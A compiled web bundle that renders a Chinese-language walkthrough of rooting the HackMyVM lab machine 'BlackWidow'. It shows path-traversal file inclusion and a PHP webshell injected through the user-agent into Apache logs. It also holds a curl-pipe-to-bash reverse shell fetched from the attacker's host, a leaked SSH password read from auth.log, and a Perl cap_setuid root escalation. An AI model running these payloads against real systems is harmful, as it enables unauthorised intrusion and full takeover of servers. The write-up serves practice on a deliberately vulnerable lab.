"use strict";(self.webpackChunktarget_machines_write_up=self.webpackChunktarget_machines_write_up||[]).push([[6785],{2318:(e,n,s)=>{s.r(n),s.d(n,{assets:()=>l,contentTitle:()=>i,default:()=>p,frontMatter:()=>r,metadata:()=>o,toc:()=>c});var a=s(5893),t=s(1151);const r={},i="BlackWidow",o={id:"HackMyVM/Machines/BlackWidow/index",title:"BlackWidow",description:"[Linux VM] [Tested on VirtualBox] created by || 0xJin",source:"@site/docs/HackMyVM/Machines/BlackWidow/index.md",sourceDirName:"HackMyVM/Machines/BlackWidow",slug:"/HackMyVM/Machines/BlackWidow/",permalink:"/Target-Machines-WriteUp/docs/HackMyVM/Machines/BlackWidow/",draft:!1,unlisted:!1,editUrl:"https://github.com/TryHackMyOffsecBox/Target-Machines-WriteUp/edit/main/docs/HackMyVM/Machines/BlackWidow/index.md",tags:[],version:"current",frontMatter:{},sidebar:"HackMyVM_Sidebar",previous:{title:"BaseME",permalink:"/Target-Machines-WriteUp/docs/HackMyVM/Machines/BaseME/"},next:{title:"Choc",permalink:"/Target-Machines-WriteUp/docs/HackMyVM/Machines/Choc/"}},l={},c=[{value:"\u9776\u673a\u542f\u52a8",id:"\u9776\u673a\u542f\u52a8",level:2},{value:"nmap \u4fe1\u606f\u641c\u96c6",id:"nmap-\u4fe1\u606f\u641c\u96c6",level:2},{value:"Web \u670d\u52a1 Port-80",id:"web-\u670d\u52a1-port-80",level:2},{value:"\u672c\u5730\u5305\u542b\u65e5\u5fd7\u6587\u4ef6\u5b9e\u73b0 webshell \u90e8\u7f72",id:"\u672c\u5730\u5305\u542b\u65e5\u5fd7\u6587\u4ef6\u5b9e\u73b0-webshell-\u90e8\u7f72",level:3},{value:"User - www-data",id:"user---www-data",level:2},{value:"\u8bfb\u53d6 SSH \u8ba4\u8bc1\u65e5\u5fd7",id:"\u8bfb\u53d6-ssh-\u8ba4\u8bc1\u65e5\u5fd7",level:3},{value:"User - viper",id:"user---viper",level:2},{value:"flag - user",id:"flag---user",level:3},{value:"\u73af\u5883\u63a2\u6d4b",id:"\u73af\u5883\u63a2\u6d4b",level:3},{value:"\u5206\u6790\u5229\u7528\u65b9\u5f0f",id:"\u5206\u6790\u5229\u7528\u65b9\u5f0f",level:3},{value:"User - root",id:"user---root",level:2},{value:"flag - root",id:"flag---root",level:3}];function d(e){const n={admonition:"admonition",code:"code",h1:"h1",h2:"h2",h3:"h3",p:"p",pre:"pre",...(0,t.a)(),...e.components};return(0,a.jsxs)(a.Fragment,{children:[(0,a.jsx)(n.h1,{id:"blackwidow",children:"BlackWidow"}),"\n",(0,a.jsxs)(n.admonition,{type:"note",children:[(0,a.jsx)(n.p,{children:"[Linux VM] [Tested on VirtualBox] created by || 0xJin"}),(0,a.jsx)(n.p,{children:"\u23f2\ufe0f Release Date // 2021-05-07"}),(0,a.jsx)(n.p,{children:"\u2714\ufe0f MD5 // 1cc57898485241d95638f83111a442e9"}),(0,a.jsx)(n.p,{children:"\u2620 Root // 38"}),(0,a.jsx)(n.p,{children:"\ud83d\udc80 User // 37"}),(0,a.jsx)(n.p,{children:"\ud83d\udcddNotes //\nHack and fun."})]}),"\n",(0,a.jsx)(n.h2,{id:"\u9776\u673a\u542f\u52a8",children:"\u9776\u673a\u542f\u52a8"}),"\n",(0,a.jsx)(n.p,{children:"\u9776\u673a IP"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-plaintext",children:"192.168.56.121\n"})}),"\n",(0,a.jsx)(n.h2,{id:"nmap-\u4fe1\u606f\u641c\u96c6",children:"nmap \u4fe1\u606f\u641c\u96c6"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-plaintext",children:"Nmap scan report for 192.168.56.121\nHost is up (0.00037s latency).\nNot shown: 65526 closed tcp ports (reset)\nPORT      STATE SERVICE    VERSION\n22/tcp    open  ssh        OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)\n| ssh-hostkey:\n|   2048 f8:3b:7c:ca:c2:f6:5a:a6:0e:3f:f9:cf:1b:a9:dd:1e (RSA)\n|   256 04:31:5a:34:d4:9b:14:71:a0:0f:22:78:2d:f3:b6:f6 (ECDSA)\n|_  256 4e:42:8e:69:b7:90:e8:27:68:df:68:8a:83:a7:87:9c (ED25519)\n80/tcp    open  http       Apache httpd 2.4.38 ((Debian))\n|_http-server-header: Apache/2.4.38 (Debian)\n|_http-title: Site doesn't have a title (text/html).\n111/tcp   open  rpcbind    2-4 (RPC #100000)\n| rpcinfo:\n|   program version    port/proto  service\n|   100000  2,3,4        111/tcp   rpcbind\n|   100000  2,3,4        111/udp   rpcbind\n|   100000  3,4          111/tcp6  rpcbind\n|   100000  3,4          111/udp6  rpcbind\n|   100003  3           2049/udp   nfs\n|   100003  3           2049/udp6  nfs\n|   100003  3,4         2049/tcp   nfs\n|   100003  3,4         2049/tcp6  nfs\n|   100005  1,2,3      49461/udp   mountd\n|   100005  1,2,3      49789/tcp   mountd\n|   100005  1,2,3      51488/udp6  mountd\n|   100005  1,2,3      58375/tcp6  mountd\n|   100021  1,3,4      35981/tcp   nlockmgr\n|   100021  1,3,4      39103/udp   nlockmgr\n|   100021  1,3,4      39461/udp6  nlockmgr\n|   100021  1,3,4      45989/tcp6  nlockmgr\n|   100227  3           2049/tcp   nfs_acl\n|   100227  3           2049/tcp6  nfs_acl\n|   100227  3           2049/udp   nfs_acl\n|_  100227  3           2049/udp6  nfs_acl\n2049/tcp  open  nfs        3-4 (RPC #100003)\n3128/tcp  open  http-proxy Squid http proxy 4.6\n|_http-server-header: squid/4.6\n|_http-title: ERROR: The requested URL could not be retrieved\n35043/tcp open  mountd     1-3 (RPC #100005)\n35981/tcp open  nlockmgr   1-4 (RPC #100021)\n36125/tcp open  mountd     1-3 (RPC #100005)\n49789/tcp open  mountd     1-3 (RPC #100005)\n"})}),"\n",(0,a.jsx)(n.h2,{id:"web-\u670d\u52a1-port-80",children:"Web \u670d\u52a1 Port-80"}),"\n",(0,a.jsxs)(n.p,{children:["\u5c1d\u8bd5\u4f7f\u7528 ",(0,a.jsx)(n.code,{children:"/usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt"})," \u4f5c\u4e3a\u5b57\u5178\u8fdb\u884c\u76ee\u5f55\u7206\u7834\uff0c\u5f97\u5230"]}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-plaintext",children:"[17:52:13] 301 -  315B  - /docs  ->  http://192.168.56.121/docs/\n[17:52:13] 301 -  318B  - /company  ->  http://192.168.56.121/company/\n[17:52:16] 301 -  313B  - /js  ->  http://192.168.56.121/js/\n[17:59:01] 403 -  279B  - /server-status\n"})}),"\n",(0,a.jsxs)(n.p,{children:["\u5728\u8bbf\u95ee ",(0,a.jsx)(n.code,{children:"http://192.168.56.121/company/"})," \u7684\u8fc7\u7a0b\u4e2d\uff0c\u5728\u7f51\u7edc\u6d41\u91cf\u4e2d\u53d1\u73b0\u4ee5\u4e0b\u6570\u636e"]}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-html",children:'\x3c!-- =======================================================\n* Template Name: Arsha - v3.0.3\n* Template URL: https://bootstrapmade.com/arsha-free-bootstrap-html-template-corporate/\n* Author: BootstrapMade.com\n* License: https://bootstrapmade.com/license/\n========================================================\n\nWe are working to develop a php inclusion method using "file" parameter - Black Widow DevOps Team.\n\n--\x3e\n'})}),"\n",(0,a.jsxs)(n.p,{children:["\u5c1d\u8bd5\u5bf9 ",(0,a.jsx)(n.code,{children:"/company/"})," \u8fd9\u4e2a\u5b50\u76ee\u5f55\u8fdb\u884c\u7206\u7834\u626b\u63cf"]}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-plaintext",children:"/.html                (Status: 403) [Size: 279]\n/.php                 (Status: 403) [Size: 279]\n/index.html           (Status: 200) [Size: 42271]\n/assets               (Status: 301) [Size: 325] [--\x3e http://192.168.56.121/company/assets/]\n/forms                (Status: 301) [Size: 324] [--\x3e http://192.168.56.121/company/forms/]\n/changelog.txt        (Status: 200) [Size: 1175]\n/Readme.txt           (Status: 200) [Size: 222]\n/.php                 (Status: 403) [Size: 279]\n/.html                (Status: 403) [Size: 279]\n/started.php          (Status: 200) [Size: 42271]\n"})}),"\n",(0,a.jsxs)(n.p,{children:["\u5c1d\u8bd5\u8bbf\u95ee ",(0,a.jsx)(n.code,{children:"/started.php?file=../../../../../etc/passwd"})]}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-plaintext",children:"# http get http://192.168.56.121/company/started.php?file=../../../../../../../../../../../../../etc/passwd\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n_apt:x:100:65534::/nonexistent:/usr/sbin/nologin\nsystemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin\nsystemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin\nsystemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin\nmessagebus:x:104:110::/nonexistent:/usr/sbin/nologin\navahi-autoipd:x:105:112:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin\nsshd:x:106:65534::/run/sshd:/usr/sbin/nologin\nsystemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin\nviper:x:1001:1001:Viper,,,:/home/viper:/bin/bash\n_rpc:x:107:65534::/run/rpcbind:/usr/sbin/nologin\nstatd:x:108:65534::/var/lib/nfs:/usr/sbin/nologin\n"})}),"\n",(0,a.jsxs)(n.p,{children:["\u7ee7\u7eed\u56de\u987e\u4e0a\u9762\u5f97\u5230\u7684\u4fe1\u606f\uff0c\u53d1\u73b0\u4e00\u4e2a\u94fe\u63a5 ",(0,a.jsx)(n.code,{children:"http://blackwidow/company/started.php"})]}),"\n",(0,a.jsxs)(n.p,{children:["\u5c06\u8fd9\u4e2a\u8def\u7531\u6dfb\u52a0\u5230 ",(0,a.jsx)(n.code,{children:"/etc/hosts"})]}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-plaintext",children:"192.168.56.121 blackwidow\n"})}),"\n",(0,a.jsx)(n.admonition,{type:"note",children:(0,a.jsx)(n.p,{children:"\u8fd9\u91cc\u662f\u5426\u8bbe\u7f6e\u8fd9\u4e2a hostname \u5176\u5b9e\u90fd\u4e0d\u4f1a\u6709\u4ec0\u4e48\u5f71\u54cd"})}),"\n",(0,a.jsx)(n.h3,{id:"\u672c\u5730\u5305\u542b\u65e5\u5fd7\u6587\u4ef6\u5b9e\u73b0-webshell-\u90e8\u7f72",children:"\u672c\u5730\u5305\u542b\u65e5\u5fd7\u6587\u4ef6\u5b9e\u73b0 webshell \u90e8\u7f72"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-shell",children:'\u250c\u2500[randark@parrot]\u2500[~]\n\u2514\u2500\u2500\u257c $ http get http://192.168.56.121/company/started.php?file=../../../../../../../../../../../../../var/log/apache2/access.log\nHTTP/1.1 200 OK\nConnection: Keep-Alive\nContent-Encoding: gzip\nContent-Length: 159\nContent-Type: text/html; charset=UTF-8\nDate: Sun, 25 Feb 2024 16:10:19 GMT\nKeep-Alive: timeout=5, max=100\nServer: Apache/2.4.38 (Debian)\nVary: Accept-Encoding\n\n......\n192.168.56.102 - - [25/Feb/2024:11:10:14 -0500] "GET /company/started.php?file=../../../../../../../../../../../../../var/log/apache2/access.log HTTP/1.1" 200 203 "-" "HTTPie/3.2.1"\n192.168.56.102 - - [25/Feb/2024:11:10:16 -0500] "GET /company/started.php?file=../../../../../../../../../../../../../var/log/apache2/access.log HTTP/1.1" 200 203 "-" "HTTPie/3.2.1"\n'})}),"\n",(0,a.jsxs)(n.p,{children:["\u5c1d\u8bd5\u4e00\u4e0b\uff0c\u53ef\u4ee5\u901a\u8fc7 ",(0,a.jsx)(n.code,{children:"user-agent"})," \u5c06\u7279\u5b9a\u5b57\u7b26\u4e32\u5199\u5165\u65e5\u5fd7\u6587\u4ef6\uff0c\u4ece\u800c\u90e8\u7f72\u4e00\u4e2a webshell \u8fdb\u53bb"]}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-shell",children:"curl http://192.168.56.121/ --user-agent \"<?php system($_GET['shell']); ?>\"\n"})}),"\n",(0,a.jsx)(n.p,{children:"\u7136\u540e"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-shell",children:'http get "http://192.168.56.121/company/started.php?file=../../../../../../../../../../../../../var/log/apache2/access.log&shell=cat+/etc/passwd"\n'})}),"\n",(0,a.jsxs)(n.p,{children:["\u5728\u8fd4\u56de\u4e2d\u5c31\u53ef\u4ee5\u53d1\u73b0\u5df2\u7ecf\u6210\u529f\u8bfb\u53d6\u4e86 ",(0,a.jsx)(n.code,{children:"/etc/passwd"})," \u6587\u4ef6"]}),"\n",(0,a.jsx)(n.p,{children:"\u5c1d\u8bd5\u501f\u52a9\u6076\u610f\u811a\u672c\u6295\u9001\u670d\u52a1\u5668\u5b9e\u73b0\u53cd\u5411 shell"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-shell",children:'\u250c\u2500[randark@parrot]\u2500[~]\n\u2514\u2500\u2500\u257c $ http get "http://192.168.56.121/company/started.php?file=../../../../../../../../../../../../../var/log/apache2/access.log&shell=curl+192.168.56.102/reverse.sh+|+bash"\n'})}),"\n",(0,a.jsx)(n.h2,{id:"user---www-data",children:"User - www-data"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-shell",children:"\u250c\u2500[randark@parrot]\u2500[~]\n\u2514\u2500\u2500\u257c $ pwncat-cs -lp 9999\n[00:26:56] Welcome to pwncat \ud83d\udc08!\n[00:27:00] received connection from 192.168.56.121:39342\n[00:27:01] 192.168.56.121:39342: registered new host w/ db\n(local) pwncat$ back\n(remote) www-data@blackwidow:/var/www/html/company$ whoami\nwww-data\n"})}),"\n",(0,a.jsx)(n.h3,{id:"\u8bfb\u53d6-ssh-\u8ba4\u8bc1\u65e5\u5fd7",children:"\u8bfb\u53d6 SSH \u8ba4\u8bc1\u65e5\u5fd7"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-shell",children:"(remote) www-data@blackwidow:/var/backups$ cat auth.log | grep sshd\n......\nDec 12 16:56:43 test sshd[29560]: Invalid user ?V1p3r2020!? from 192.168.1.109 port 7090\n......\n"})}),"\n",(0,a.jsx)(n.p,{children:"\u5f97\u5230\u4e00\u4e32\u7591\u4f3c"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-plaintext",children:"viper:?V1p3r2020!?\n"})}),"\n",(0,a.jsx)(n.h2,{id:"user---viper",children:"User - viper"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-plaintext",children:"\u250c\u2500[randark@parrot]\u2500[~]\n\u2514\u2500\u2500\u257c $ pwncat-cs viper@192.168.56.121\n[00:48:05] Welcome to pwncat \ud83d\udc08!\nPassword: ************\n[00:48:11] 192.168.56.121:22: normalizing shell path\n[00:48:12] 192.168.56.121:22: registered new host w/ db\n(local) pwncat$ back\n(remote) viper@blackwidow:/home/viper$ whoami\nviper\n"})}),"\n",(0,a.jsx)(n.h3,{id:"flag---user",children:"flag - user"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-shell",children:"(remote) viper@blackwidow:/home/viper$ cat local.txt\nd930fe79919376e6d08972dae222526b\n"})}),"\n",(0,a.jsx)(n.h3,{id:"\u73af\u5883\u63a2\u6d4b",children:"\u73af\u5883\u63a2\u6d4b"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-plaintext",metastring:'title="getcap -r / 2>/dev/null"',children:"/home/viper/backup_site/assets/vendor/weapon/arsenic = cap_setuid+ep\n/usr/bin/perl =\n/usr/bin/perl5.28.1 =\n/usr/bin/ping = cap_net_raw+ep\n/usr/lib/squid/pinger = cap_net_raw+ep\n"})}),"\n",(0,a.jsxs)(n.p,{children:["\u5728\u5176\u4e2d\u53d1\u73b0\u4e86\u4e00\u4e2a\u7279\u6b8a\u7684 ",(0,a.jsx)(n.code,{children:"cap_setuid"})," \u6743\u9650\uff0c\u5e76\u4e14\u4e3a\u4e00\u4e2a\u53ef\u63a5\u7ba1\u6587\u4ef6 ",(0,a.jsx)(n.code,{children:"/home/viper/backup_site/assets/vendor/weapon/arsenic"})]}),"\n",(0,a.jsx)(n.h3,{id:"\u5206\u6790\u5229\u7528\u65b9\u5f0f",children:"\u5206\u6790\u5229\u7528\u65b9\u5f0f"}),"\n",(0,a.jsxs)(n.p,{children:["\u67e5\u770b ",(0,a.jsx)(n.code,{children:"/home/viper/backup_site/assets/vendor/weapon/arsenic"})," \u6587\u4ef6\u7684\u5f62\u5f0f"]}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-shell",children:'(remote) viper@blackwidow:/home/viper$ file /home/viper/backup_site/assets/vendor/weapon/arsenic\n/home/viper/backup_site/assets/vendor/weapon/arsenic: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=36da142560b2aa57fcade932db83015f6f612052, stripped\n(remote) viper@blackwidow:/home/viper$ /home/viper/backup_site/assets/vendor/weapon/arsenic --version\n\nThis is perl 5, version 28, subversion 1 (v5.28.1) built for x86_64-linux-gnu-thread-multi\n(with 65 registered patches, see perl -V for more detail)\n\nCopyright 1987-2018, Larry Wall\n\nPerl may be copied only under the terms of either the Artistic License or the\nGNU General Public License, which may be found in the Perl 5 source kit.\n\nComplete documentation for Perl, including FAQ lists, should be found on\nthis system using "man perl" or "perldoc perl".  If you have access to the\nInternet, point your browser at http://www.perl.org/, the Perl Home Page.\n'})}),"\n",(0,a.jsxs)(n.p,{children:["\u90a3\u5c31\u5f88\u7b80\u5355\u4e86\uff0c\u8fd9\u4e2a\u6587\u4ef6\u5c31\u662f ",(0,a.jsx)(n.code,{children:"perl"})," \u7a0b\u5e8f\uff0c\u76f4\u63a5\u5229\u7528\u5c31\u884c"]}),"\n",(0,a.jsx)(n.h2,{id:"user---root",children:"User - root"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-shell",children:"(remote) viper@blackwidow:/home/viper$ /home/viper/backup_site/assets/vendor/weapon/arsenic -e 'use POSIX qw(setuid); POSIX::setuid(0); exec\"/bin/bash\";'\nroot@blackwidow:~# whoami\nroot\n"})}),"\n",(0,a.jsx)(n.h3,{id:"flag---root",children:"flag - root"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-shell",children:"root@blackwidow:/root# cat root.txt\n\n\n\u2584\u2584\u2584\u2584\xb7 \u2584\u2584\u258c   \u2584\u2584\u2584\xb7  \u2584\u2584\xb7 \u2584 \u2022\u2584     \u2584\u2584\u258c \u2590 \u2584\u258c\u25aa  \xb7\u2584\u2584\u2584\u2584        \u2584\u2584\u258c \u2590 \u2584\u258c\n\u2590\u2588 \u2580\u2588\u25aa\u2588\u2588\u2022  \u2590\u2588 \u2580\u2588 \u2590\u2588 \u258c\u25aa\u2588\u258c\u2584\u258c\u25aa    \u2588\u2588\xb7 \u2588\u258c\u2590\u2588\u2588\u2588 \u2588\u2588\u25aa \u2588\u2588 \u25aa     \u2588\u2588\xb7 \u2588\u258c\u2590\u2588\n\u2590\u2588\u2580\u2580\u2588\u2584\u2588\u2588\u25aa  \u2584\u2588\u2580\u2580\u2588 \u2588\u2588 \u2584\u2584\u2590\u2580\u2580\u2584\xb7    \u2588\u2588\u25aa\u2590\u2588\u2590\u2590\u258c\u2590\u2588\xb7\u2590\u2588\xb7 \u2590\u2588\u258c \u2584\u2588\u2580\u2584 \u2588\u2588\u25aa\u2590\u2588\u2590\u2590\u258c\n\u2588\u2588\u2584\u25aa\u2590\u2588\u2590\u2588\u258c\u2590\u258c\u2590\u2588 \u25aa\u2590\u258c\u2590\u2588\u2588\u2588\u258c\u2590\u2588.\u2588\u258c    \u2590\u2588\u258c\u2588\u2588\u2590\u2588\u258c\u2590\u2588\u258c\u2588\u2588. \u2588\u2588 \u2590\u2588\u258c.\u2590\u258c\u2590\u2588\u258c\u2588\u2588\u2590\u2588\u258c\n\xb7\u2580\u2580\u2580\u2580 .\u2580\u2580\u2580  \u2580  \u2580 \xb7\u2580\u2580\u2580 \xb7\u2580  \u2580     \u2580\u2580\u2580\u2580 \u2580\u25aa\u2580\u2580\u2580\u2580\u2580\u2580\u2580\u2580\u2022  \u2580\u2588\u2584\u2580\u25aa \u2580\u2580\u2580\u2580 \u2580\u25aa\n\n\nCongrats!\n\nYou've rooted Black Widow!\n\n0xJin - mindsflee\nFollow on Instagram: 0xjiin\nFollow on Twitter: 0xJin , @mindsflee\n\n\n0780eb289a44ba17ea499ffa6322b335\n"})})]})}function p(e={}){const{wrapper:n}={...(0,t.a)(),...e.components};return n?(0,a.jsx)(n,{...e,children:(0,a.jsx)(d,{...e})}):d(e)}},1151:(e,n,s)=>{s.d(n,{Z:()=>o,a:()=>i});var a=s(7294);const t={},r=a.createContext(t);function i(e){const n=a.useContext(r);return a.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function o(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(t):e.components||t:i(e.components),a.createElement(r.Provider,{value:n},e.children)}}}]);